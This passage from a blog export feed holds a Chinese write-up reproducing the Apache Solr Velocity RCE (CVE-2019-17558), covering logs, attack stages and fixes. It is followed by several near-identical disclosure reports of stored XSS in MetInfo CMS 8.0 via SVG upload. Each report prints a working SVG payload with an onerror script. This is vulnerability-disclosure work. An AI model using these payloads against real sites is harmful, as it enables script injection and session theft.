directory</p><p>分析：若攻击尝试执行不存在的命令（如ls拼写错误），会触发IOException。</p><p><strong>4.高频率异常请求</strong></p><p>WARN  [qtp1947426831-24] o.a.s.s.SolrDispatchFilter handleException] org.apache.solr.common.SolrException: org.apache.velocity.exception.ParseErrorException: Encountered “ <VARIABLE> “v.template” “ at line 1, column 10.</p><p>分析：攻击尝试多次发送含错误参数的请求，导致 Solr 记录高频异常。</p><h3 id="8-3-漏洞利用行为总结"><a href="#8-3-漏洞利用行为总结" class="headerlink" title="8.3 漏洞利用行为总结"></a>8.3 漏洞利用行为总结</h3><p><strong>针对漏洞利用过程中的流量和服务器日志进行发现，总结漏洞利用过程中行为特征如下：</strong></p><p><strong>1.目标探测与配置确认</strong></p><p>攻击者首先探测目标 Apache Solr 实例是否启用了 Velocity 模板响应功能，并确认是否存在错误配置（例如允许外部资源加载器）。</p><p><strong>2.构造恶意请求</strong></p><p>利用已知漏洞，攻击者构造包含恶意 Velocity 模板代码的 HTTP 请求，该请求中通常包含参数 wt&#x3D;velocity 和 v.template.custom。通过这些参数，攻击者将恶意代码注入到模板中。</p><p><strong>3.远程代码执行</strong></p><p>当 Solr 服务器处理该请求时，Velocity 模板引擎解析并执行注入的恶意代码，从而实现任意 Java 代码的执行。此步骤使攻击者能够执行系统命令、读取敏感信息或完全接管服务器。</p><p><strong>4.后续利用</strong></p><p>成功利用漏洞后，攻击者可以进一步渗透系统，获取更多权限，甚至在服务器上部署后门，实现长时间的控制和数据窃取。</p><h2 id="九、漏洞修复建议"><a href="#九、漏洞修复建议" class="headerlink" title="九、漏洞修复建议"></a>九、漏洞修复建议</h2><h3 id="1-升级-Apache-Solr-版本："><a href="#1-升级-Apache-Solr-版本：" class="headerlink" title="1.升级 Apache Solr 版本："></a>1.升级 Apache Solr 版本：</h3><p>最直接的修复方式是升级到 Apache Solr 8.4.0 或更高版本，因为这些版本已修复该漏洞，并加强了 Velocity 模板引擎的配置，阻止了外部资源加载和模板注入。</p><h3 id="2-禁用-Velocity-模板功能："><a href="#2-禁用-Velocity-模板功能：" class="headerlink" title="2.禁用 Velocity 模板功能："></a>2.禁用 Velocity 模板功能：</h3><p>如果不需要使用 Velocity 模板引擎，最好禁用相关功能，防止潜在的利用风险。可以通过修改 solrconfig.xml 文件，确保 wt&#x3D;velocity 参数不被启用。</p><h3 id="3-配置限制和访问控制："><a href="#3-配置限制和访问控制：" class="headerlink" title="3.配置限制和访问控制："></a>3.配置限制和访问控制：</h3><p>限制访问：通过防火墙或访问控制列表（ACL）限制对 Solr 服务的访问，仅允许可信的内部或外部 IP 访问。避免公开暴露 Solr 服务，特别是在互联网环境中。</p><p>应用访问控制：确保只有授权的用户可以执行特定操作，防止未经授权的用户访问敏感功能。</p><h3 id="4-安全配置审查："><a href="#4-安全配置审查：" class="headerlink" title="4.安全配置审查："></a>4.安全配置审查：</h3><p>定期检查 Solr 配置，确保所有安全选项已启用，并且没有过时的默认配置（如开启 Velocity 模板引擎）。</p><p>确保服务器的操作系统和 Java 环境也保持最新，以减少其他潜在的安全漏洞。</p><h3 id="5-监控和日志审计："><a href="#5-监控和日志审计：" class="headerlink" title="5.监控和日志审计："></a>5.监控和日志审计：</h3><p>开启日志记录功能，确保可以跟踪所有的请求和响应，特别是 HTTP 请求中包含 wt&#x3D;velocity 或其他可疑参数时。</p><p>使用监控工具检测异常行为，及时识别并响应可能的攻击。</p><h3 id="6-补丁管理和安全扫描："><a href="#6-补丁管理和安全扫描：" class="headerlink" title="6.补丁管理和安全扫描："></a>6.补丁管理和安全扫描：</h3><p>及时应用所有官方发布的安全补丁，并使用安全扫描工具定期检查系统中是否存在已知漏洞。</p><p>关注 Apache Solr 项目的安全公告，确保及时跟进修复建议。</p><h2 id="十、总结"><a href="#十、总结" class="headerlink" title="十、总结"></a>十、总结</h2><p>本次实验复现了Solr远程代码执行漏洞。实验中启用模板构造恶意请求，实现远程命令执行。结果显示漏洞可窃取敏感信息并控制系统。验证提醒用户及时更新系统或关闭无用功能，强化防护，确保为漏洞修复提供充分依据。</p>]]></content>
    
    
    <categories>
      
      <category>漏洞挖掘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
      <tag>solr</tag>
      
      <tag>远程命令执行</tag>
      
      <tag>CVE-2019-17558</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Stored XSS Vulnerability in MetInfo CMS Column Module</title>
    <link href="/2025/08/22/Stored-XSS-in-MetInfo-Column-Module/"/>
    <url>/2025/08/22/Stored-XSS-in-MetInfo-Column-Module/</url>
    
    <content type="html"><![CDATA[<h1 id="Stored-XSS-Vulnerability-in-MetInfo-CMS-Column-Module"><a href="#Stored-XSS-Vulnerability-in-MetInfo-CMS-Column-Module" class="headerlink" title="Stored XSS Vulnerability in MetInfo CMS Column Module"></a>Stored XSS Vulnerability in MetInfo CMS Column Module</h1><h2 id="Vulnerability-Description"><a href="#Vulnerability-Description" class="headerlink" title="Vulnerability Description"></a>Vulnerability Description</h2><p>A stored Cross-Site Scripting (XSS) vulnerability has been discovered in MetInfo CMS version 8.0. The vulnerability exists in the column management module, specifically in the <code>app\system\column\admin\index.class.php</code> component. The vulnerability allows attackers to upload malicious SVG files containing JavaScript code that executes when the uploaded file is viewed or accessed by users.</p><h2 id="Affected-Product"><a href="#Affected-Product" class="headerlink" title="Affected Product"></a>Affected Product</h2><ul><li><strong>Product</strong>: MetInfo CMS</li><li><strong>Version</strong>: 8.0</li><li><strong>Component</strong>: Column Management Module (<code>app\system\column\admin\index.class.php</code>)</li><li><strong>CWE</strong>: CWE-79: Improper Neutralization of Input During Web Page Generation (‘Cross-site Scripting’)</li></ul><h2 id="Technical-Details"><a href="#Technical-Details" class="headerlink" title="Technical Details"></a>Technical Details</h2><p>I deployed MetInfo CMS 8.0 locally using PHPStudy with the access URL <a href="http://metlnfo/">http://metlnfo/</a>. The source code is available at: <a href="https://www.metinfo.cn/download/89.html">https://www.metinfo.cn/download/89.html</a></p><p>After logging into the admin panel, I accessed the column management module at <code>http://metlnfo/admin/#/column</code> which utilizes the vulnerable component.</p><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-22%20111153.png" alt="Column Management Interface"></p><h2 id="Proof-of-Concept-PoC"><a href="#Proof-of-Concept-PoC" class="headerlink" title="Proof of Concept (PoC)"></a>Proof of Concept (PoC)</h2><p>After accessing the column management module, I selected the settings option which revealed a file upload functionality:</p><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-22%20111227.png" alt="File Upload Interface"></p><p>I created a malicious SVG file with the following content:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.w3.org/2000/svg&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">image</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;alert(&#x27;XSS测试&#x27;)&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span><br></code></pre></td></tr></table></figure><p>The file was successfully uploaded without any content validation or sanitization:</p><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-22%20111304.png" alt="Successful Upload Confirmation"></p><p>When viewing the uploaded file, the JavaScript code embedded in the SVG was automatically executed in the browser context:</p><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-22%20111321.png" alt="XSS Execution Proof"></p><p>After clicking the “Save” button, the malicious SVG file was permanently stored in the system, resulting in a stored XSS vulnerability:</p><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-22%20111651.png" alt="Stored XSS Persistence"></p><h2 id="Vulnerable-Code-Analysis"><a href="#Vulnerable-Code-Analysis" class="headerlink" title="Vulnerable Code Analysis"></a>Vulnerable Code Analysis</h2><p>The vulnerability exists in the column management module’s file upload handling, which fails to:</p><ol><li>Properly validate the content of SVG files before accepting them</li><li>Sanitize potentially dangerous elements and attributes in SVG files</li><li>Implement proper MIME type restrictions for uploaded files</li><li>Convert SVG files to safer image formats before storing them</li></ol><p>The core issue is that the column management module allows SVG files to be uploaded and later served with the correct MIME type that enables JavaScript execution within the browser.</p><h2 id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h2><p>This vulnerability allows attackers with administrative access to:</p><ol><li>Execute arbitrary JavaScript code in the context of other users’ browsers, including administrators</li><li>Steal sensitive information such as session cookies and authentication tokens</li><li>Perform unauthorized actions on behalf of victims</li><li>Potentially escalate to more severe attacks by chaining with other vulnerabilities</li></ol><p>Since the column management is a core feature accessed by administrators, this vulnerability could lead to complete administrative account compromise.</p><h2 id="Remediation"><a href="#Remediation" class="headerlink" title="Remediation"></a>Remediation</h2><p>To fix this vulnerability, the application should implement the following security measures:</p><ol><li>Enhance the column management module to perform content validation and sanitization of SVG files</li><li>Strip potentially dangerous elements and attributes from SVG files</li><li>Consider converting SVG files to raster image formats (PNG, JPEG) during the upload process</li><li>Implement proper Content Security Policy (CSP) headers to prevent script execution from uploaded files</li><li>Serve SVG files with a MIME type that prevents script execution (e.g., <code>image/svg+xml-sanitized</code>)</li></ol><h2 id="Timeline"><a href="#Timeline" class="headerlink" title="Timeline"></a>Timeline</h2><ul><li><strong>2025-08-22</strong>: Vulnerability discovered</li><li><strong>2025-08-22</strong>: Documentation and proof of concept created</li><li><strong>[Future Date]</strong>: Vulnerability reported to vendor</li><li><strong>[Future Date]</strong>: CVE assigned</li></ul>]]></content>
    
    
    <categories>
      
      <category>漏洞挖掘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞挖掘</tag>
      
      <tag>CVE</tag>
      
      <tag>XSS</tag>
      
      <tag>文件上传</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Stored XSS Vulnerability in MetInfo CMS Webset Module via SVG Upload</title>
    <link href="/2025/08/22/Stored-XSS-Vulnerability-in-MetInfo-Webset-Module/"/>
    <url>/2025/08/22/Stored-XSS-Vulnerability-in-MetInfo-Webset-Module/</url>
    
    <content type="html"><![CDATA[<h1 id="Stored-XSS-Vulnerability-in-MetInfo-CMS-Webset-Module-via-SVG-Upload"><a href="#Stored-XSS-Vulnerability-in-MetInfo-CMS-Webset-Module-via-SVG-Upload" class="headerlink" title="Stored XSS Vulnerability in MetInfo CMS Webset Module via SVG Upload"></a>Stored XSS Vulnerability in MetInfo CMS Webset Module via SVG Upload</h1><h2 id="Vulnerability-Description"><a href="#Vulnerability-Description" class="headerlink" title="Vulnerability Description"></a>Vulnerability Description</h2><p>A stored Cross-Site Scripting (XSS) vulnerability has been discovered in MetInfo CMS version 8.0. The vulnerability exists due to insufficient validation and sanitization of SVG file uploads in the <code>app\system\include\module\uploadify.class.php</code> component, specifically in the website settings module. This security flaw allows attackers to upload malicious SVG files containing JavaScript code that executes when the uploaded file is viewed or accessed.</p><h2 id="Affected-Product"><a href="#Affected-Product" class="headerlink" title="Affected Product"></a>Affected Product</h2><ul><li><strong>Product</strong>: MetInfo CMS</li><li><strong>Version</strong>: 8.0</li><li><strong>Component</strong>: File Upload Functionality (<code>app\system\include\module\uploadify.class.php</code>)</li><li><strong>CWE</strong>: CWE-79: Improper Neutralization of Input During Web Page Generation (‘Cross-site Scripting’)</li></ul><h2 id="Technical-Details"><a href="#Technical-Details" class="headerlink" title="Technical Details"></a>Technical Details</h2><p>I deployed MetInfo CMS 8.0 locally using PHPStudy with the access URL <a href="http://metlnfo/">http://metlnfo/</a>. The source code is available at: <a href="https://www.metinfo.cn/download/89.html">https://www.metinfo.cn/download/89.html</a></p><p>After logging into the admin panel, I identified the website settings module at the URL path <code>http://metlnfo/admin/#/webset/?head_tab_active=0</code> which allows uploading of various file types without proper validation.</p><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-22%20143635.png" alt="Website Settings Interface"></p><h2 id="Proof-of-Concept-PoC"><a href="#Proof-of-Concept-PoC" class="headerlink" title="Proof of Concept (PoC)"></a>Proof of Concept (PoC)</h2><p>I created a malicious SVG file with the following content:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.w3.org/2000/svg&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">image</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;alert(&#x27;XSS测试&#x27;)&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span><br></code></pre></td></tr></table></figure><p>The file was successfully uploaded to the website settings module without any content validation or sanitization:</p><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-22%20143823.png" alt="Successful Upload Confirmation"></p><p>When viewing the uploaded file, the JavaScript code embedded in the SVG was automatically executed in the browser context:</p><p><img src="/img/image-20250822143908393.png" alt="XSS Execution Proof"></p><p>After clicking the “Save” button, the malicious SVG file was permanently stored in the system, resulting in a stored XSS vulnerability that would trigger whenever any user accessed the affected settings page:</p><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-22%20143921.png" alt="Stored XSS Persistence"></p><h2 id="Vulnerable-Code-Analysis"><a href="#Vulnerable-Code-Analysis" class="headerlink" title="Vulnerable Code Analysis"></a>Vulnerable Code Analysis</h2><p>The vulnerability exists in the file upload handling component (<code>app\system\include\module\uploadify.class.php</code>), which fails to:</p><ol><li>Properly validate the content of SVG files before accepting them</li><li>Sanitize potentially dangerous elements and attributes in SVG files</li><li>Implement proper MIME type restrictions for uploaded files</li><li>Convert SVG files to safer image formats before storing them</li></ol><p>The core issue is that the upload functionality in the website settings module allows SVG files to be uploaded and later served with the correct MIME type that enables JavaScript execution within the browser.</p><h2 id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h2><p>This vulnerability allows attackers with administrative access to:</p><ol><li>Execute arbitrary JavaScript code in the context of other users’ browsers, including site administrators</li><li>Steal sensitive information such as session cookies and authentication tokens</li><li>Perform unauthorized actions on behalf of victims</li><li>Potentially escalate to more severe attacks by chaining with other vulnerabilities</li></ol><p>While exploitation requires administrative access to the website settings feature, it creates a significant security risk as the stored XSS payload can affect any user viewing the compromised settings page, including higher-privileged administrators.</p><h2 id="Remediation"><a href="#Remediation" class="headerlink" title="Remediation"></a>Remediation</h2><p>To fix this vulnerability, the application should implement the following security measures:</p><ol><li>Enhance the <code>uploadify.class.php</code> component to perform content validation and sanitization of SVG files</li><li>Strip potentially dangerous elements and attributes from SVG files</li><li>Consider converting SVG files to raster image formats (PNG, JPEG) during the upload process</li><li>Implement proper Content Security Policy (CSP) headers to prevent script execution from uploaded files</li><li>Serve SVG files with a MIME type that prevents script execution (e.g., <code>image/svg+xml-sanitized</code>)</li><li>Implement stricter file type checking that goes beyond extension validation</li></ol><h2 id="Timeline"><a href="#Timeline" class="headerlink" title="Timeline"></a>Timeline</h2><ul><li><strong>2025-08-22</strong>: Vulnerability discovered</li><li><strong>2025-08-22</strong>: Documentation and proof of concept created</li><li><strong>[Future Date]</strong>: Vulnerability reported to vendor</li><li><strong>[Future Date]</strong>: CVE assigned</li></ul>]]></content>
    
    
    <categories>
      
      <category>漏洞挖掘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞挖掘</tag>
      
      <tag>CVE</tag>
      
      <tag>XSS</tag>
      
      <tag>文件上传</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Stored XSS Vulnerability in MetInfo CMS via SVG File Upload</title>
    <link href="/2025/08/22/Stored-XSS-Vulnerability-in-MetInfo-via-SVG-Upload/"/>
    <url>/2025/08/22/Stored-XSS-Vulnerability-in-MetInfo-via-SVG-Upload/</url>
    
    <content type="html"><![CDATA[<h1 id="Stored-XSS-Vulnerability-in-MetInfo-CMS-via-SVG-File-Upload"><a href="#Stored-XSS-Vulnerability-in-MetInfo-CMS-via-SVG-File-Upload" class="headerlink" title="Stored XSS Vulnerability in MetInfo CMS via SVG File Upload"></a>Stored XSS Vulnerability in MetInfo CMS via SVG File Upload</h1><h2 id="Vulnerability-Description"><a href="#Vulnerability-Description" class="headerlink" title="Vulnerability Description"></a>Vulnerability Description</h2><p>A stored Cross-Site Scripting (XSS) vulnerability has been discovered in MetInfo CMS version 8.0. The vulnerability exists due to insufficient validation and sanitization of SVG file uploads in the <code>app\system\include\module\editor\Uploader.class.php</code> component. This security flaw allows attackers to upload malicious SVG files containing JavaScript code that executes when the uploaded file is viewed or accessed.</p><h2 id="Affected-Product"><a href="#Affected-Product" class="headerlink" title="Affected Product"></a>Affected Product</h2><ul><li><strong>Product</strong>: MetInfo CMS</li><li><strong>Version</strong>: 8.0</li><li><strong>Component</strong>: File Upload Functionality (<code>app\system\include\module\editor\Uploader.class.php</code>)</li><li><strong>CWE</strong>: CWE-79: Improper Neutralization of Input During Web Page Generation (‘Cross-site Scripting’)</li></ul><h2 id="Technical-Details"><a href="#Technical-Details" class="headerlink" title="Technical Details"></a>Technical Details</h2><p>I deployed MetInfo CMS 8.0 locally using PHPStudy with the access URL <a href="http://metlnfo/">http://metlnfo/</a>. The source code is available at: <a href="https://www.metinfo.cn/download/89.html">https://www.metinfo.cn/download/89.html</a></p><p>After logging into the admin panel, I identified the product management module at the URL path <code>http://metlnfo/admin/#/manage/?module=product&amp;class1=127</code> which utilizes the <code>app\system\product\admin\product_admin.class.php</code> component.</p><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-22%20100807.png" alt="Product Management Interface"></p><p>By examining the product editing functionality, I discovered that the system allows file uploads without proper validation of SVG content:</p><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-22%20095759.png" alt="File Upload Interface"></p><h2 id="Proof-of-Concept-PoC"><a href="#Proof-of-Concept-PoC" class="headerlink" title="Proof of Concept (PoC)"></a>Proof of Concept (PoC)</h2><p>I created a malicious SVG file with the following content:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.w3.org/2000/svg&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">image</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;alert(&#x27;XSS测试&#x27;)&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span><br></code></pre></td></tr></table></figure><p>The file was successfully uploaded to the system without any content validation or sanitization:</p><p><img src="/img/image-20250822101552130.png" alt="Successful Upload Confirmation"></p><p>When viewing the uploaded file, the JavaScript code embedded in the SVG was automatically executed in the browser context:</p><p><img src="/img/image-20250822101637873.png" alt="XSS Execution Proof"></p><p>After clicking the “Save” button, the malicious SVG file was permanently stored in the system, resulting in a stored XSS vulnerability that would trigger whenever any user accessed the affected page:</p><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-22%20101700.png" alt="Stored XSS Persistence"></p><h2 id="Vulnerable-Code-Analysis"><a href="#Vulnerable-Code-Analysis" class="headerlink" title="Vulnerable Code Analysis"></a>Vulnerable Code Analysis</h2><p>The vulnerability exists in the file upload handling component (<code>app\system\include\module\editor\Uploader.class.php</code>), which fails to:</p><ol><li>Properly validate the content of SVG files before accepting them</li><li>Sanitize potentially dangerous elements and attributes in SVG files</li><li>Implement proper MIME type restrictions for uploaded files</li><li>Convert SVG files to safer image formats before storing them</li></ol><p>The core issue is that the upload functionality allows SVG files to be uploaded and later served with the correct MIME type that enables JavaScript execution within the browser.</p><h2 id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h2><p>This vulnerability allows attackers with administrative access to:</p><ol><li>Execute arbitrary JavaScript code in the context of other users’ browsers, including site administrators</li><li>Steal sensitive information such as session cookies and authentication tokens</li><li>Perform unauthorized actions on behalf of victims</li><li>Potentially escalate to more severe attacks by chaining with other vulnerabilities</li></ol><p>While exploitation requires administrative access to the product management feature, it creates a significant security risk as the stored XSS payload can affect any user viewing the compromised product page, including higher-privileged administrators.</p><h2 id="Remediation"><a href="#Remediation" class="headerlink" title="Remediation"></a>Remediation</h2><p>To fix this vulnerability, the application should implement the following security measures:</p><ol><li>Enhance the <code>Uploader.class.php</code> component to perform content validation and sanitization of SVG files</li><li>Strip potentially dangerous elements and attributes from SVG files</li><li>Consider converting SVG files to raster image formats (PNG, JPEG) during the upload process</li><li>Implement proper Content Security Policy (CSP) headers to prevent script execution from uploaded files</li><li>Serve SVG files with a MIME type that prevents script execution (e.g., <code>image/svg+xml-sanitized</code>)</li></ol><h2 id="Timeline"><a href="#Timeline" class="headerlink" title="Timeline"></a>Timeline</h2><ul><li><strong>2025-08-22</strong>: Vulnerability discovered</li><li><strong>2025-08-22</strong>: Documentation and proof of concept created</li><li><strong>[Future Date]</strong>: Vulnerability reported to vendor</li><li><strong>[Future Date]</strong>: CVE assigned</li></ul>]]></content>
    
    
    <categories>
      
      <category>漏洞挖掘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞挖掘</tag>
      
      <tag>CVE</tag>
      
      <tag>XSS</tag>
      
      <tag>文件上传</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Stored XSS Vulnerability in MetInfo CMS Download Module</title>
    <link href="/2025/08/22/Stored-XSS-in-MetInfo-Download-Module/"/>
    <url>/2025/08/22/Stored-XSS-in-MetInfo-Download-Module/</url>
    
    <content type="html"><![CDATA[<h1 id="Stored-XSS-Vulnerability-in-MetInfo-CMS-Download-Module"><a href="#Stored-XSS-Vulnerability-in-MetInfo-CMS-Download-Module" class="headerlink" title="Stored XSS Vulnerability in MetInfo CMS Download Module"></a>Stored XSS Vulnerability in MetInfo CMS Download Module</h1><h2 id="Vulnerability-Description"><a href="#Vulnerability-Description" class="headerlink" title="Vulnerability Description"></a>Vulnerability Description</h2><p>A stored Cross-Site Scripting (XSS) vulnerability has been discovered in MetInfo CMS version 8.0. The vulnerability exists in the download management module, specifically in the <code>app\system\download\admin\download_admin.class.php</code> component. The vulnerability allows attackers to upload malicious SVG files containing JavaScript code that executes when the uploaded file is viewed or accessed by users.</p><h2 id="Affected-Product"><a href="#Affected-Product" class="headerlink" title="Affected Product"></a>Affected Product</h2><ul><li><strong>Product</strong>: MetInfo CMS</li><li><strong>Version</strong>: 8.0</li><li><strong>Component</strong>: Download Management Module (<code>app\system\download\admin\download_admin.class.php</code>)</li><li><strong>CWE</strong>: CWE-79: Improper Neutralization of Input During Web Page Generation (‘Cross-site Scripting’)</li></ul><h2 id="Technical-Details"><a href="#Technical-Details" class="headerlink" title="Technical Details"></a>Technical Details</h2><p>I deployed MetInfo CMS 8.0 locally using PHPStudy with the access URL <a href="http://metlnfo/">http://metlnfo/</a>. The source code is available at: <a href="https://www.metinfo.cn/download/89.html">https://www.metinfo.cn/download/89.html</a></p><p>After logging into the admin panel, I accessed the download management module at <code>http://metlnfo/admin/#/manage/?module=download&amp;class1=129</code> which utilizes the vulnerable component.</p><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-22%20104459.png" alt="Download Management Interface"></p><h2 id="Proof-of-Concept-PoC"><a href="#Proof-of-Concept-PoC" class="headerlink" title="Proof of Concept (PoC)"></a>Proof of Concept (PoC)</h2><p>After accessing the download management module, I selected the edit option which revealed a file upload functionality:</p><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-22%20104601.png" alt="File Upload Interface"></p><p>I created a malicious SVG file with the following content:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.w3.org/2000/svg&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">image</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;alert(&#x27;XSS测试&#x27;)&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span><br></code></pre></td></tr></table></figure><p>The file was successfully uploaded without any content validation or sanitization:</p><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-22%20104720.png" alt="Successful Upload Confirmation"></p><p>When viewing the uploaded file, the JavaScript code embedded in the SVG was automatically executed in the browser context:</p><p><img src="/img/image-20250822104811764.png" alt="XSS Execution Proof"></p><p>After clicking the “Save” button, the malicious SVG file was permanently stored in the system, resulting in a stored XSS vulnerability that affects both front-end users and administrators:</p><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-22%20104832.png" alt="Stored XSS Persistence"></p><h2 id="Vulnerable-Code-Analysis"><a href="#Vulnerable-Code-Analysis" class="headerlink" title="Vulnerable Code Analysis"></a>Vulnerable Code Analysis</h2><p>The vulnerability exists in the download management module’s file upload handling, which fails to:</p><ol><li>Properly validate the content of SVG files before accepting them</li><li>Sanitize potentially dangerous elements and attributes in SVG files</li><li>Implement proper MIME type restrictions for uploaded files</li><li>Convert SVG files to safer image formats before storing them</li></ol><p>The core issue is that the download management module allows SVG files to be uploaded and later served with the correct MIME type that enables JavaScript execution within the browser.</p><h2 id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h2><p>This vulnerability allows attackers with administrative access to:</p><ol><li>Execute arbitrary JavaScript code in the context of other users’ browsers, including administrators and front-end users</li><li>Steal sensitive information such as session cookies and authentication tokens</li><li>Perform unauthorized actions on behalf of victims</li><li>Potentially escalate to more severe attacks by chaining with other vulnerabilities</li></ol><p>As confirmed in testing, the impact extends to both front-end and back-end users, creating a significant security risk for all site visitors.</p><h2 id="Remediation"><a href="#Remediation" class="headerlink" title="Remediation"></a>Remediation</h2><p>To fix this vulnerability, the application should implement the following security measures:</p><ol><li>Enhance the download management module to perform content validation and sanitization of SVG files</li><li>Strip potentially dangerous elements and attributes from SVG files</li><li>Consider converting SVG files to raster image formats (PNG, JPEG) during the upload process</li><li>Implement proper Content Security Policy (CSP) headers to prevent script execution from uploaded files</li><li>Serve SVG files with a MIME type that prevents script execution (e.g., <code>image/svg+xml-sanitized</code>)</li></ol><h2 id="Timeline"><a href="#Timeline" class="headerlink" title="Timeline"></a>Timeline</h2><ul><li><strong>2025-08-22</strong>: Vulnerability discovered</li><li><strong>2025-08-22</strong>: Documentation and proof of concept created</li><li><strong>[Future Date]</strong>: Vulnerability reported to vendor</li><li><strong>[Future Date]</strong>: CVE assigned</li></ul>]]></content>
    
    
    <categories>
      
      <category>漏洞挖掘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞挖掘</tag>
      
      <tag>CVE</tag>
      
      <tag>XSS</tag>
      
      <tag>文件上传</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Stored XSS Vulnerability in MetInfo CMS Image Module</title>
    <link href="/2025/08/22/Stored-XSS-in-MetInfo-Image-Module/"/>
    <url>/2025/08/22/Stored-XSS-in-MetInfo-Image-Module/</url>
    
    <content type="html"><![CDATA[<h1 id="Stored-XSS-Vulnerability-in-MetInfo-CMS-Image-Module"><a href="#Stored-XSS-Vulnerability-in-MetInfo-CMS-Image-Module" class="headerlink" title="Stored XSS Vulnerability in MetInfo CMS Image Module"></a>Stored XSS Vulnerability in MetInfo CMS Image Module</h1><h2 id="Vulnerability-Description"><a href="#Vulnerability-Description" class="headerlink" title="Vulnerability Description"></a>Vulnerability Description</h2><p>A stored Cross-Site Scripting (XSS) vulnerability has been discovered in MetInfo CMS version 8.0. The vulnerability exists in the image management module, specifically in the <code>app\system\img\admin\img_admin.class.php</code> component. The vulnerability allows attackers to upload malicious SVG files containing JavaScript code that executes when the uploaded file is viewed or accessed by users.</p><h2 id="Affected-Product"><a href="#Affected-Product" class="headerlink" title="Affected Product"></a>Affected Product</h2><ul><li><strong>Product</strong>: MetInfo CMS</li><li><strong>Version</strong>: 8.0</li><li><strong>Component</strong>: Image Management Module (<code>app\system\img\admin\img_admin.class.php</code>)</li><li><strong>CWE</strong>: CWE-79: Improper Neutralization of Input During Web Page Generation (‘Cross-site Scripting’)</li></ul><h2 id="Technical-Details"><a href="#Technical-Details" class="headerlink" title="Technical Details"></a>Technical Details</h2><p>I deployed MetInfo CMS 8.0 locally using PHPStudy with the access URL <a href="http://metlnfo/">http://metlnfo/</a>. The source code is available at: <a href="https://www.metinfo.cn/download/89.html">https://www.metinfo.cn/download/89.html</a></p><p>After logging into the admin panel, I accessed the image management module at <code>http://metlnfo/admin/#/manage/?module=img&amp;class1=130</code> which utilizes the vulnerable component.</p><p><img 